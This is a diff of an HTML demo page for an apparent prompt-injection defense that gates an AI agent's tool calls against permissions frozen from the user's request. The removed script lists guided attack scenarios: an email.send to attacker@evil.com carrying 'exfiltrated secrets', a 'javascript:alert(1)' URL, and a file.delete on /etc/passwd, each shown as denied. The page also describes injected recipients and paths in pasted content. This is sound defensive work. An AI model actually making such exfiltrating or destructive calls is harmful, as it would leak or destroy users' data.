@@ -7,173 +7,7 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Serif:wght@600;700&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-<style>
-  :root {
-    --paper:#EDF0F2; --card:#FAFBFC; --ink:#1C2B3A; --muted:#5D6B78;
-    --line:#C9D2DA; --line-soft:#DDE3E8; --trust:#E3EAF1;
-    --allow:#1E6E44; --deny:#A8322D; --escalate:#8A6D1F; --action:#24547A;
-    --serif:"IBM Plex Serif", Georgia, serif;
-    --sans:"IBM Plex Sans", system-ui, -apple-system, sans-serif;
-    --mono:"IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, monospace;
-  }
-  * { box-sizing:border-box; }
-  body { margin:0; background:var(--paper); color:var(--ink);
-    font:14px/1.55 var(--sans); }
-  a { color:var(--action); }
-  code { font-family:var(--mono); font-size:.92em; background:#E5EAEE;
-    border-radius:3px; padding:1px 5px; }
-
-  /* ── header ─────────────────────────────────────────────── */
-  header { background:var(--card); border-bottom:2px solid var(--ink);
-    padding:20px 28px; display:flex; align-items:baseline; gap:14px; flex-wrap:wrap; }
-  header h1 { font:700 22px/1 var(--serif); margin:0; letter-spacing:.2px; }
-  header h1 .shield { font-size:18px; margin-right:6px; }
-  header .tag { color:var(--muted); font-size:13px; }
-  .mode { margin-left:auto; text-align:right; }
-  .switch { display:inline-flex; border:1.5px solid var(--ink); border-radius:6px; overflow:hidden; }
-  .switch button { background:var(--card); color:var(--muted); border:0; padding:7px 16px;
-    cursor:pointer; font:600 13px var(--sans); }
-  .switch button.on { background:var(--ink); color:var(--card); }
-  .mode .hint { display:block; color:var(--muted); font-size:11.5px; margin-top:5px; }
-
-  /* ── 3-step ribbon ──────────────────────────────────────── */
-  .ribbon { max-width:1180px; margin:0 auto; padding:18px 28px 0; }
-  .steps { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; }
-  @media (max-width:880px){ .steps { grid-template-columns:1fr; } }
-  .stepcard { background:var(--card); border:1px solid var(--line); border-radius:8px;
-    padding:12px 14px; display:flex; gap:12px; align-items:flex-start; }
-  .stepcard .n { font:700 15px var(--serif); background:var(--ink); color:var(--card);
-    width:26px; height:26px; border-radius:50%; flex:none;
-    display:flex; align-items:center; justify-content:center; }
-  .stepcard b { display:block; font-size:13px; }
-  .stepcard span { color:var(--muted); font-size:12px; }
-  details.more { margin-top:12px; background:var(--card); border:1px solid var(--line);
-    border-radius:8px; padding:10px 14px; font-size:13px; color:var(--muted); }
-  details.more summary { cursor:pointer; color:var(--action); font-weight:600; font-size:13px; }
-  details.more p { margin:10px 0 4px; }
-  details.more b { color:var(--ink); }
-
-  /* ── layout ─────────────────────────────────────────────── */
-  main { display:grid; grid-template-columns:5fr 6fr; gap:20px;
-    padding:20px 28px 40px; max-width:1180px; margin:0 auto; }
-  @media (max-width:880px){ main { grid-template-columns:1fr; } }
-  .panel { background:var(--card); border:1px solid var(--line); border-radius:10px;
-    padding:20px; }
-  .panel.trusted { background:var(--trust); border-color:#B7C6D4; }
-  .zone { font:700 10.5px var(--mono); letter-spacing:1.6px; color:var(--muted);
-    text-transform:uppercase; margin-bottom:6px; }
-  .panel h2 { font:600 17px var(--serif); margin:0 0 4px; }
-  .panel .sub { color:var(--muted); font-size:12.5px; margin-bottom:14px; }
-
-  label { display:block; color:var(--muted); font-size:12px; font-weight:600;
-    margin:12px 0 4px; }
-  input, select, textarea { width:100%; background:#fff; color:var(--ink);
-    border:1px solid var(--line); border-radius:6px; padding:8px 10px;
-    font:13px var(--sans); }
-  textarea { font-family:var(--mono); min-height:72px; resize:vertical; }
-  input:focus-visible, select:focus-visible, textarea:focus-visible,
-  button:focus-visible, summary:focus-visible {
-    outline:2px solid var(--action); outline-offset:1px; }
-
-  .row { display:grid; grid-template-columns:1fr 1fr auto; gap:8px;
-    align-items:end; margin-bottom:8px; }
-  .row .x { background:transparent; border:1px solid var(--line); color:var(--muted);
-    border-radius:6px; padding:8px 10px; cursor:pointer; }
-  .row .x:hover { color:var(--deny); border-color:var(--deny); }
-
-  button.act { background:var(--action); color:#fff; border:0; border-radius:6px;
-    padding:10px 16px; font:600 13px var(--sans); cursor:pointer; margin-top:12px; }
-  button.act:hover { background:#1C4463; }
-  button.ghost { background:transparent; color:var(--action);
-    border:1px dashed var(--line); }
-  button.ghost:hover { background:#EFF3F6; }
-  .btnrow { display:flex; gap:10px; flex-wrap:wrap; align-items:center; }
-  .note { color:var(--muted); font-size:12px; margin-top:8px; }
-
-  /* session status chip */
-  .chip { display:inline-flex; align-items:center; gap:6px; font-size:11.5px;
-    font-weight:600; border-radius:999px; padding:3px 10px; margin-bottom:10px;
-    border:1px solid var(--line); color:var(--muted); background:#fff; }
-  .chip.ok { color:var(--allow); border-color:var(--allow); background:#EAF3EE; }
-
-  /* constraints box */
-  .constraints { margin-top:8px; font-size:12px; color:var(--muted);
-    border:1px dashed var(--line); border-radius:6px; padding:9px 12px; background:#fff; }
-  .constraints b { color:var(--ink); }
-  .constraints .c { display:block; margin-top:2px; }
-  .constraints code { background:#EFF2F5; }
-
-  /* scenarios */
-  .scenarios { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:8px; }
-  @media (max-width:600px){ .scenarios { grid-template-columns:1fr; } }
-  .scenario { text-align:left; background:#fff; border:1px solid var(--line);
-    color:var(--ink); border-radius:6px; padding:9px 11px; cursor:pointer;
-    font:12.5px var(--sans); display:flex; flex-direction:column; gap:4px; }
-  .scenario:hover { border-color:var(--action); }
-  .scenario .t { font-weight:600; display:flex; justify-content:space-between;
-    align-items:center; gap:8px; }
-  .scenario small { color:var(--muted); }
-  .expect { font:700 9.5px var(--mono); letter-spacing:1px; padding:2px 7px;
-    border-radius:3px; border:1.5px solid; flex:none; }
-  .expect.allow { color:var(--allow); border-color:var(--allow); }
-  .expect.deny { color:var(--deny); border-color:var(--deny); }
-
-  /* ── verdict: the stamp ─────────────────────────────────── */
-  .verdict { margin-top:16px; border:1px solid var(--line); border-radius:8px;
-    padding:18px; background:#fff; display:none; }
-  .verdict.show { display:block; }
-  .stamp { display:inline-block; font:700 20px/1 var(--mono); letter-spacing:3px;
-    text-transform:uppercase; padding:10px 18px; border:3px double;
-    border-radius:6px; transform:rotate(-3.5deg); }
-  .stamp.allow { color:var(--allow); border-color:var(--allow); }
-  .stamp.deny { color:var(--deny); border-color:var(--deny); }
-  .stamp.escalate { color:var(--escalate); border-color:var(--escalate); }
-  @keyframes thunk { 0%{ transform:rotate(-3.5deg) scale(1.7); opacity:0; }
-    70%{ transform:rotate(-3.5deg) scale(.96); opacity:1; }
-    100%{ transform:rotate(-3.5deg) scale(1); } }
-  .stamp.inked { animation:thunk .28s ease-out; }
-  @media (prefers-reduced-motion: reduce){ .stamp.inked { animation:none; } }
-
-  /* decision pipeline */
-  .pipe { display:flex; gap:6px; flex-wrap:wrap; margin-top:16px; }
-  .gate { flex:1; min-width:118px; border:1px solid var(--line-soft); border-radius:6px;
-    padding:7px 9px; font-size:11px; color:var(--muted); background:var(--card); }
-  .gate b { display:block; font-size:11.5px; color:var(--ink); margin-bottom:1px; }
-  .gate.passed { border-color:var(--allow); opacity:.72; }
-  .gate.passed b::after { content:" ✓"; color:var(--allow); }
-  .gate.fired-deny { border-color:var(--deny); background:#F7ECEB; }
-  .gate.fired-deny b { color:var(--deny); }
-  .gate.fired-allow { border-color:var(--allow); background:#EAF3EE; }
-  .gate.fired-allow b { color:var(--allow); }
-  .gate.fired-escalate { border-color:var(--escalate); background:#F5F0E2; }
-  .gate.fired-escalate b { color:var(--escalate); }
-  .gate.notreached { opacity:.38; }
-
-  .explain { margin-top:12px; font-size:12.5px; color:var(--muted);
-    border-left:3px solid var(--action); padding:7px 12px; background:#F1F5F8;
-    border-radius:0 6px 6px 0; }
-  .explain b { color:var(--ink); }
-  .kv { color:var(--muted); font-size:12px; margin-top:10px; }
-  .kv b { color:var(--ink); font-weight:600; }
-  .err-detail { color:var(--deny); font-family:var(--mono); font-size:11.5px; }
-
-  /* ── ledger ─────────────────────────────────────────────── */
-  .ledger { grid-column:1 / -1; }
-  .tablewrap { overflow-x:auto; }
-  table { width:100%; border-collapse:collapse; font-size:12px; min-width:720px; }
-  th,td { text-align:left; padding:8px 10px; border-bottom:1px solid var(--line-soft);
-    vertical-align:top; }
-  th { color:var(--muted); font:600 10.5px var(--mono); letter-spacing:1.2px;
-    text-transform:uppercase; }
-  tbody tr:hover { background:#F2F5F8; }
-  td.code { font-family:var(--mono); }
-  .ministamp { display:inline-block; font:700 9.5px var(--mono); letter-spacing:1px;
-    padding:2px 7px; border:1.5px solid; border-radius:3px; transform:rotate(-2deg); }
-  .ministamp.allow { color:var(--allow); border-color:var(--allow); }
-  .ministamp.deny { color:var(--deny); border-color:var(--deny); }
-  .ministamp.escalate { color:var(--escalate); border-color:var(--escalate); }
-  .threats { color:var(--muted); font-size:11px; font-family:var(--mono); }
-</style>
+<link rel="stylesheet" href="/demo/static/styles.css">
 </head>
 <body>
 <header>
@@ -183,357 +17,236 @@
     <div class="switch" id="modeSwitch" role="group" aria-label="Enforcement mode">
       <button data-mode="observe" class="on">observe</button>
       <button data-mode="enforce">enforce</button>
+      <button data-mode="">server default</button>
     </div>
     <span class="hint" id="modeHint">observe: every call goes through, but the ledger records what enforce would do</span>
   </div>
 </header>
 
-<div class="ribbon">
-  <div class="steps">
-    <div class="stepcard"><span class="n">1</span>
-      <div><b>Grant what the user asked for</b>
-      <span>Runs once, on the trusted path — before the agent reads anything untrusted.</span></div></div>
-    <div class="stepcard"><span class="n">2</span>
-      <div><b>Let the agent try things</b>
-      <span>Each call passes four deterministic gates. No LLM judges it; denials fail closed.</span></div></div>
-    <div class="stepcard"><span class="n">3</span>
-      <div><b>Read the ledger</b>
-      <span>Every decision is appended with its reason, violation detail, and OWASP threat tags.</span></div></div>
+<nav class="tabs" aria-label="Sections">
+  <a href="#authorize" data-view="authorize" aria-current="page">Authorize</a>
+  <a href="#ledger" data-view="ledger">Ledger</a>
+  <a href="#parser" data-view="parser">Parser lab</a>
+  <a href="#setup" data-view="setup">Setup</a>
+</nav>
+
+<!-- ═══ FOLDER 1 · AUTHORIZE ═══════════════════════════════════ -->
+<div class="view active" id="view-authorize">
+  <div class="sheet">
+    <div class="steps">
+      <div class="stepcard"><span class="n">1</span>
+        <div><b>Grant what the user asked for</b>
+        <span>Runs once, on the trusted path — before the agent reads anything untrusted.</span></div></div>
+      <div class="stepcard"><span class="n">2</span>
+        <div><b>Let the agent try things</b>
+        <span>Each call passes four deterministic gates. No LLM judges it; denials fail closed.</span></div></div>
+      <div class="stepcard"><span class="n">3</span>
+        <div><b>Review the record</b>
+        <span>Every decision lands in the <a href="#ledger">Ledger</a>; the trusted parser is tested in the <a href="#parser">Parser lab</a>.</span></div></div>
+    </div>
+    <details class="more">
+      <summary>What this proves, in one paragraph</summary>
+      <p>A prompt injection can corrupt what an agent <b>wants</b> to do — it cannot expand what
+      the agent is <b>allowed</b> to do. Permissions are fixed from the user's trusted request
+      before any untrusted content is read (step 1). Each tool call is then checked against those
+      frozen permissions by a pure, deterministic pipeline (step 2): an <b>allowlist</b> gate
+      (unknown tools are refused), an <b>argument-shape</b> gate (types, enums, regex patterns,
+      length limits declared per tool — violations are denied <code>invalid_arguments</code>
+      before the policy store is even consulted), a <b>resource-binding</b> gate (a call that
+      can't be bound to a concrete resource is denied <code>missing_resource</code>), and finally
+      the <b>intent check</b> against the policy store. The <a href="#ledger">Ledger</a> is
+      append-only: your security telemetry. The <a href="#parser">Parser lab</a> tests the one
+      LLM in the system — the trusted-path intent parser — against labeled attack cases.</p>
+    </details>
+
+    <div class="cols">
+      <!-- 1 · GRANT -->
+      <section class="panel trusted" aria-labelledby="h-grant">
+        <div class="zone">▚ trusted path · runs once</div>
+        <h2 id="h-grant">1 · Grant intent</h2>
+        <div class="sub">Declare the tool → resource pairs the user's request authorizes.
+          In production this comes from parsing the request itself.</div>
+
+        <div class="btnrow">
+          <div style="flex:1"><label for="session">Session id</label><input id="session" value="conv-42" /></div>
+          <div style="flex:1"><label for="subject">Subject</label><input id="subject" value="user:alice" /></div>
+        </div>
+
+        <label>Allowed actions <span style="font-weight:400">(blank resource = any)</span></label>
+        <div id="actions"></div>
+        <button class="act ghost" id="addAction">+ add another action</button>
+        <button class="act" id="provision">Grant these actions</button>
+        <div class="note" id="provNote">Nothing granted yet — calls will be refused with <code>no_session</code>.</div>
+      </section>
+
+      <!-- 2 · ATTEMPT -->
+      <section class="panel" aria-labelledby="h-attempt">
+        <div class="zone">▞ untrusted path · every tool call</div>
+        <h2 id="h-attempt">2 · The agent attempts a call</h2>
+        <div class="sub">Pick a tool and edit its arguments freely — or use a guided attempt below.</div>
+
+        <span class="chip" id="sessChip">○ no grants yet — do step 1 first</span>
+
+        <label for="tool">Tool</label>
+        <select id="tool"></select>
+
+        <div class="constraints" id="constraints">Loading tool registry…</div>
+
+        <label for="argJson">Arguments <span style="font-weight:400">(JSON — any types, extra fields welcome)</span></label>
+        <textarea id="argJson" spellcheck="false">{"to": "bob@example.com"}</textarea>
+
+        <div class="btnrow">
+          <button class="act" id="send">Attempt call</button>
+        </div>
+
+        <label>Guided attempts <span style="font-weight:400">— each demonstrates one outcome</span></label>
+        <div class="scenarios" id="scenarios"></div>
+
+        <div class="verdict" id="verdict" aria-live="polite">
+          <span class="stamp" id="stamp"></span>
+          <div class="pipe" id="pipe"></div>
+          <div class="explain" id="explain"></div>
+          <div class="kv" id="verdictKv"></div>
+        </div>
+      </section>
+    </div>
   </div>
-  <details class="more">
-    <summary>What this proves, in one paragraph</summary>
-    <p>A prompt injection can corrupt what an agent <b>wants</b> to do — it cannot expand what
-    the agent is <b>allowed</b> to do. Permissions are fixed from the user's trusted request
-    before any untrusted content is read (step 1). Each tool call is then checked against those
-    frozen permissions by a pure, deterministic pipeline (step 2): an <b>allowlist</b> gate
-    (unknown tools are refused), an <b>argument-shape</b> gate (types, enums, regex patterns,
-    length limits declared per tool — violations are denied <code>invalid_arguments</code>
-    before the policy store is even consulted), a <b>resource-binding</b> gate (a call that
-    can't be bound to a concrete resource is denied <code>missing_resource</code>), and finally
-    the <b>intent check</b> against the policy store. The ledger (step 3) is append-only:
-    your security telemetry. Try the guided attempts in panel 2 — each one demonstrates a
-    different outcome.</p>
-  </details>
 </div>
 
-<main>
-  <!-- 1 · GRANT -->
-  <section class="panel trusted" aria-labelledby="h-grant">
-    <div class="zone">▚ trusted path · runs once</div>
-    <h2 id="h-grant">1 · Grant intent</h2>
-    <div class="sub">Declare the tool → resource pairs the user's request authorizes.
-      In production this comes from parsing the request itself.</div>
+<!-- ═══ FOLDER 2 · LEDGER ══════════════════════════════════════ -->
+<div class="view" id="view-ledger">
+  <div class="sheet">
+    <section class="panel" aria-labelledby="h-ledger">
+      <div class="zone">▞ untrusted path · the record</div>
+      <h2 id="h-ledger">Decision ledger</h2>
+      <div class="sub">Append-only. <b>Detail</b> carries the specific argument violation
+        (e.g. <code>pattern_mismatch:url</code>) or the fail-closed error; threat tags follow
+        the OWASP Agentic Top 10. Refreshes each time you open this folder.</div>
+      <div class="tablewrap">
+      <table>
+        <thead><tr><th>decision</th><th>tool → resource</th><th>reason</th><th>detail</th><th>mode</th><th>would-have</th><th>threats</th></tr></thead>
+        <tbody id="audit"><tr><td colspan="7" class="note">No decisions yet — grant a session in Authorize, then attempt a call.</td></tr></tbody>
+      </table>
+      </div>
+    </section>
+  </div>
+</div>
 
-    <div class="btnrow">
-      <div style="flex:1"><label for="session">Session id</label><input id="session" value="conv-42" /></div>
-      <div style="flex:1"><label for="subject">Subject</label><input id="subject" value="user:alice" /></div>
+<!-- ═══ FOLDER 3 · PARSER LAB ══════════════════════════════════ -->
+<div class="view" id="view-parser">
+  <div class="sheet">
+    <section class="panel" aria-labelledby="h-parser">
+      <div class="zone">▚ trusted path · parser quality</div>
+      <h2 id="h-parser">Parser lab</h2>
+      <div class="sub">The one LLM in the system is the trusted-path intent parser, and these are
+        its labeled test cases — the same set as <code>python -m evals.harness</code>. Each case
+        shows the request, what the parser <b>should grant</b>, and what it <b>must never grant</b>
+        (injected recipients, URLs, and paths hidden in pasted content). Run them live: a
+        <b>LEAKED</b> grant is the red flag — attack content became a permission. Running needs
+        <code>ANTHROPIC_API_KEY</code> in the repo's <code>.env</code> when the demo starts;
+        browsing the cases doesn't.</div>
+
+      <div class="btnrow">
+        <button class="act" id="evalSmoke">Run smoke subset</button>
+        <button class="act ghost" id="evalFull">Run full set</button>
+        <span class="evalnote" id="evalStatus" aria-live="polite"></span>
+      </div>
+
+      <div class="evalmetrics" id="evalMetrics" hidden></div>
+
+      <div class="filters" id="caseFilters" aria-label="Filter cases by tag"></div>
+
+      <div class="tablewrap">
+      <table>
+        <thead><tr><th>case</th><th>the request</th><th>should grant</th><th>must never grant</th><th>result</th></tr></thead>
+        <tbody id="evalRows"><tr><td colspan="5" class="note">Loading the case set…</td></tr></tbody>
+      </table>
+      </div>
+    </section>
+  </div>
+</div>
+
+<!-- ═══ FOLDER 4 · SETUP ═══════════════════════════════════════ -->
+<div class="view" id="view-setup">
+  <div class="sheet">
+    <div class="cols">
+      <section class="panel trusted" aria-labelledby="h-settings">
+        <div class="zone">▚ operator · engine settings</div>
+        <h2 id="h-settings">Engine settings</h2>
+        <div class="sub">Applied immediately: the demo rebuilds its in-process engine with the
+          new configuration, and grants and the ledger carry over. In a real deployment these
+          are environment variables — the deployment block on the right stays in sync.</div>
+
+        <label for="cfgMode">Default mode</label>
+        <select id="cfgMode">
+          <option value="observe">observe — allow everything, record what enforce would do</option>
+          <option value="enforce">enforce — real denials, fail closed</option>
+        </select>
+        <div class="note">The Authorize folder's switch can still override this per call;
+          its "server default" position uses this setting.</div>
+
+        <div class="checkrow"><input type="checkbox" id="cfgAllowlist" checked />
+          <span><b>Enforce the tool allowlist</b> — a tool missing from the registry is denied
+          <code>unknown_tool</code> before any store lookup. Leave on.</span></div>
+
+        <div class="checkrow"><input type="checkbox" id="cfgTrust" />
+          <span><b>Trust the explicit <code>resource</code> field</b> — only if the caller of
+          <code>/v1/decide</code> is fully trusted; otherwise a request could claim a granted
+          resource while its arguments target another.</span></div>
+
+        <label for="cfgTimeout">Decision timeout (seconds) — on timeout, enforce mode denies fail-closed</label>
+        <input id="cfgTimeout" type="number" min="0.1" max="60" step="0.1" value="2" />
+
+        <label for="cfgEscalatable">Escalatable tools — out-of-intent calls ask a human instead of a hard deny (comma-separated)</label>
+        <input id="cfgEscalatable" placeholder="email.send, file.write" />
+
+        <label for="cfgParser">Intent parser (used by <code>POST /v1/sessions:parse</code>)</label>
+        <select id="cfgParser">
+          <option value="mock">mock — deterministic, no network</option>
+          <option value="anthropic" id="cfgParserAnthropic">anthropic — live extraction</option>
+        </select>
+
+        <div class="checkrow"><input type="checkbox" id="cfgRequireAuth" />
+          <span><b>Require provisioning auth</b> — the write path refuses requests without a
+          bearer token (fail closed).</span></div>
+        <label for="cfgToken">Provisioning token — the Authorize folder will send it automatically once set</label>
+        <input id="cfgToken" type="password" placeholder="leave blank to keep unset" autocomplete="off" />
+
+        <button class="act" id="applyConfig">Apply settings</button>
+        <span class="evalnote" id="configStatus" aria-live="polite"></span>
+      </section>
+
+      <section class="panel" aria-labelledby="h-deploy">
+        <div class="zone">▚ operator · deployment</div>
+        <h2 id="h-deploy">Deployment variables</h2>
+        <div class="sub">The running configuration as environment variables, ready for a real
+          deployment of <code>uvicorn engine.api.server:app</code>. The commented lines are the
+          settings a demo can't change while running: the policy store, the audit file, and the
+          registry file path.</div>
+        <pre class="snippet" id="envSnippet">Loading…</pre>
+        <button class="act ghost" id="copySnippet">Copy variables</button>
+        <span class="evalnote" id="copyStatus" aria-live="polite"></span>
+      </section>
     </div>
 
-    <label>Allowed actions <span style="font-weight:400">(blank resource = any)</span></label>
-    <div id="actions"></div>
-    <button class="act ghost" id="addAction">+ add another action</button>
-    <button class="act" id="provision">Grant these actions</button>
-    <div class="note" id="provNote">Nothing granted yet — calls will be refused with <code>no_session</code>.</div>
-  </section>
+    <section class="panel" style="margin-top:20px" aria-labelledby="h-registry">
+      <div class="zone">▚ operator · tool registry</div>
+      <h2 id="h-registry">Tool registry</h2>
+      <div class="sub">The allowlist, per-tool resource binding, and argument constraints the
+        engine runs with — the admin's main ongoing configuration surface. Edit the JSON and
+        apply: it validates first (unknown types, bad regex, and duplicate tools are rejected
+        with the reason) and takes effect live across every folder. For deployment, save this
+        JSON to a file and set <code>INTENTGUARD_TOOL_REGISTRY_PATH</code>.</div>
+      <textarea id="registryJson" spellcheck="false" style="min-height:260px"></textarea>
+      <div class="btnrow">
+        <button class="act" id="applyRegistry">Validate and apply registry</button>
+        <button class="act ghost" id="reloadRegistry">Reset to running registry</button>
+        <span class="evalnote" id="registryStatus" aria-live="polite"></span>
+      </div>
+    </section>
+  </div>
+</div>
 
-  <!-- 2 · ATTEMPT -->
-  <section class="panel" aria-labelledby="h-attempt">
-    <div class="zone">▞ untrusted path · every tool call</div>
-    <h2 id="h-attempt">2 · The agent attempts a call</h2>
-    <div class="sub">Pick a tool and edit its arguments freely — or use a guided attempt below.</div>
-
-    <span class="chip" id="sessChip">○ no grants yet — do step 1 first</span>
-
-    <label for="tool">Tool</label>
-    <select id="tool"></select>
-
-    <div class="constraints" id="constraints">Loading tool registry…</div>
-
-    <label for="argJson">Arguments <span style="font-weight:400">(JSON — any types, extra fields welcome)</span></label>
-    <textarea id="argJson" spellcheck="false">{"to": "bob@example.com"}</textarea>
-
-    <div class="btnrow">
-      <button class="act" id="send">Attempt call</button>
-    </div>
-
-    <label>Guided attempts <span style="font-weight:400">— each demonstrates one outcome</span></label>
-    <div class="scenarios" id="scenarios"></div>
-
-    <div class="verdict" id="verdict" aria-live="polite">
-      <span class="stamp" id="stamp"></span>
-      <div class="pipe" id="pipe"></div>
-      <div class="explain" id="explain"></div>
-      <div class="kv" id="verdictKv"></div>
-    </div>
-  </section>
-
-  <!-- 3 · LEDGER -->
-  <section class="panel ledger" aria-labelledby="h-ledger">
-    <h2 id="h-ledger">3 · Decision ledger</h2>
-    <div class="sub">Append-only. <b>Detail</b> carries the specific argument violation
-      (e.g. <code>pattern_mismatch:url</code>) or the fail-closed error; threat tags follow
-      the OWASP Agentic Top 10.</div>
-    <div class="tablewrap">
-    <table>
-      <thead><tr><th>decision</th><th>tool → resource</th><th>reason</th><th>detail</th><th>mode</th><th>would-have</th><th>threats</th></tr></thead>
-      <tbody id="audit"><tr><td colspan="7" class="note">No decisions yet — grant a session, then attempt a call.</td></tr></tbody>
-    </table>
-    </div>
-  </section>
-</main>
-
-<script>
-let mode = "observe";
-let REGISTRY = [];          // [{name, description, resource_args|resource_arg, arguments:[ArgSpec]}]
-
-// Sensible starting arguments per bundled tool.
-const ARG_PRESETS = {
-  "email.send":      {to:"bob@example.com", subject:"Weekly notes", body:"Hi Bob — notes attached."},
-  "calendar.read":   {},
-  "calendar.create": {calendar:"work"},
-  "http.get":        {url:"https://example.com/data"},
-  "file.read":       {path:"/tmp/notes.txt"},
-  "file.write":      {path:"/tmp/notes.txt", content:"hello"},
-};
-
-// Plain-language explanation for every decision reason.
-const REASON_EXPLAIN = {
-  in_intent: "<b>Allowed.</b> This exact tool → resource pair was granted in step 1 from the user's trusted request.",
-  not_in_intent: "<b>Denied: outside the user's intent.</b> The session exists, but this tool → resource was never granted. This is the injection defense — corrupted instructions can't expand what the agent may do.",
-  no_session: "<b>Denied: no grants.</b> Nothing has been granted for this session id + subject yet. Use step 1 first.",
-  unknown_tool: "<b>Denied at the allowlist gate.</b> The tool isn't in the registry, so it can't be authorized at all — no store lookup happens.",
-  invalid_arguments: "<b>Denied at the argument-shape gate.</b> An argument violates the tool's declared constraints (type / enum / pattern / max length) — the violation detail is below. Checked deterministically, before the policy store is consulted.",
-  missing_resource: "<b>Denied at the resource-binding gate.</b> The argument carrying the security-relevant resource is missing or blank, so the call can't be bound to any specific grant. IntentGuard fails closed rather than let it match an \"any\" grant.",
-  pdp_error_failclosed: "<b>Denied, fail-closed.</b> The policy store errored or timed out. In enforce mode the engine never fails open.",
-  escalated_for_review: "<b>Escalated.</b> Outside the granted intent, but this tool is configured as escalatable — a human is asked to approve instead of a hard deny.",
-};
-
-// Which pipeline gate each reason fires at (index into GATES; 3 = store check).
-const GATES = [
-  {name:"1 · Allowlist", desc:"tool in registry?"},
-  {name:"2 · Argument shape", desc:"types, enums, patterns, lengths"},
-  {name:"3 · Resource binding", desc:"resource argument present?"},
-  {name:"4 · Intent check", desc:"granted in policy store?"},
-];
-const REASON_GATE = {
-  unknown_tool:0, invalid_arguments:1, missing_resource:2,
-  in_intent:3, not_in_intent:3, no_session:3, pdp_error_failclosed:3, escalated_for_review:3,
-};
-
-// Guided attempts: each triggers one decision reason (with the default grants:
-// email.send → bob@example.com, calendar.read → any).
-const SCENARIOS = [
-  {title:"In intent", expect:"allow",
-   sub:"email.send to bob — granted in step 1",
-   tool:"email.send", args:{to:"bob@example.com", subject:"Weekly notes"}},
-  {title:"Prompt injection", expect:"deny",
-   sub:"same tool, attacker's recipient → not_in_intent",
-   tool:"email.send", args:{to:"attacker@evil.com", body:"exfiltrated secrets"}},
-  {title:"Bad URL scheme", expect:"deny",
-   sub:"url must match https?:// → invalid_arguments",
-   tool:"http.get", args:{url:"javascript:alert(1)"}},
-  {title:"Wrong argument type", expect:"deny",
-   sub:"path must be a string → invalid_arguments",
-   tool:"file.write", args:{path:42, content:"x"}},
-  {title:"Recipient not email-shaped", expect:"deny",
-   sub:"to must match an email pattern → invalid_arguments",
-   tool:"email.send", args:{to:"not-an-email"}},
-  {title:"Unknown tool", expect:"deny",
-   sub:"file.delete isn't in the registry → unknown_tool",
-   tool:"file.delete", args:{path:"/etc/passwd"}},
-  {title:"Missing resource", expect:"deny",
-   sub:"no recipient: can't bind to a grant → missing_resource",
-   tool:"email.send", args:{subject:"no recipient"}},
-];
-
-// --- mode toggle ---
-const MODE_HINTS = {
-  observe: "observe: every call goes through, but the ledger records what enforce would do",
-  enforce: "enforce: real denials — outside-intent and malformed calls are refused",
-};
-document.querySelectorAll("#modeSwitch button").forEach(b => b.onclick = () => {
-  mode = b.dataset.mode;
-  document.querySelectorAll("#modeSwitch button").forEach(x => x.classList.toggle("on", x===b));
-  document.getElementById("modeHint").textContent = MODE_HINTS[mode];
-});
-
-// --- registry: populate tool select + constraints box ---
-function resourceArgsOf(spec){
-  if (Array.isArray(spec.resource_args)) return spec.resource_args;
-  return spec.resource_arg ? [spec.resource_arg] : [];
-}
-function constraintText(a){
-  const parts = [];
-  if (a.type) parts.push(a.type);
-  if (a.required) parts.push("required");
-  if (a.enum) parts.push("one of " + JSON.stringify(a.enum));
-  if (a.pattern) parts.push("pattern " + a.pattern);
-  if (a.max_length != null) parts.push("≤" + a.max_length + " chars");
-  return parts.join(" · ") || "no constraints";
-}
-function renderConstraints(){
-  const spec = REGISTRY.find(t => t.name === toolEl.value);
-  const el = document.getElementById("constraints");
-  if (!spec){ el.innerHTML = "This tool is <b>not in the registry</b> — the allowlist gate will refuse it (<code>unknown_tool</code>)."; return; }
-  const res = resourceArgsOf(spec);
-  let html = `<b>${spec.name}</b> — ${spec.description || "no description"}<span class="c">🔑 resource argument: ${res.length ? res.map(r=>`<code>${r}</code>`).join(" + ") : "<i>none (binds to any resource)</i>"}${res.length ? " — must be present, or the call is denied <code>missing_resource</code>" : ""}</span>`;
-  const args = spec.arguments || [];
-  if (args.length){
-    html += `<span class="c">📐 declared constraints (violations are denied <code>invalid_arguments</code>):</span>`;
-    for (const a of args) html += `<span class="c">&nbsp;&nbsp;<code>${a.name}</code>: ${constraintText(a)}</span>`;
-  } else {
-    html += `<span class="c">📐 no argument constraints declared — any argument shapes are accepted.</span>`;
-  }
-  html += `<span class="c">✏️ undeclared arguments are never rejected — add anything to the JSON below.</span>`;
-  el.innerHTML = html;
-}
-async function loadRegistry(){
-  const r = await fetch("/demo/registry");
-  REGISTRY = (await r.json()).tools || [];
-  toolEl.innerHTML = REGISTRY.map(t=>`<option>${t.name}</option>`).join("")
-    + `<option value="file.delete">file.delete (not in registry)</option>`;
-  renderConstraints();
-  setArgsFor(toolEl.value);
-}
-
-// --- grant action rows ---
-const actionsEl = document.getElementById("actions");
-function addRow(tool="email.send", resource="bob@example.com") {
-  const div = document.createElement("div");
-  div.className = "row";
-  const opts = (REGISTRY.length ? REGISTRY.map(t=>t.name) : Object.keys(ARG_PRESETS));
-  div.innerHTML = `
-    <select class="t" aria-label="tool">${opts.map(t=>`<option ${t===tool?"selected":""}>${t}</option>`).join("")}</select>
-    <input class="r" aria-label="resource" placeholder="resource (blank = any)" value="${resource}" />
-    <button class="x" aria-label="remove action">✕</button>`;
-  div.querySelector(".x").onclick = () => div.remove();
-  actionsEl.appendChild(div);
-}
-addRow("email.send","bob@example.com");
-addRow("calendar.read","");
-document.getElementById("addAction").onclick = () => addRow();
-
-// --- tool select updates constraints + argument preset ---
-const toolEl = document.getElementById("tool");
-function setArgsFor(tool){
-  document.getElementById("argJson").value = JSON.stringify(ARG_PRESETS[tool] ?? {});
-}
-toolEl.onchange = () => { renderConstraints(); setArgsFor(toolEl.value); };
-
-// --- guided attempts ---
-const scenEl = document.getElementById("scenarios");
-for (const s of SCENARIOS){
-  const b = document.createElement("button");
-  b.className = "scenario";
-  b.innerHTML = `<span class="t">${s.title}<span class="expect ${s.expect}">${s.expect.toUpperCase()}</span></span><small>${s.sub}</small>`;
-  b.onclick = () => {
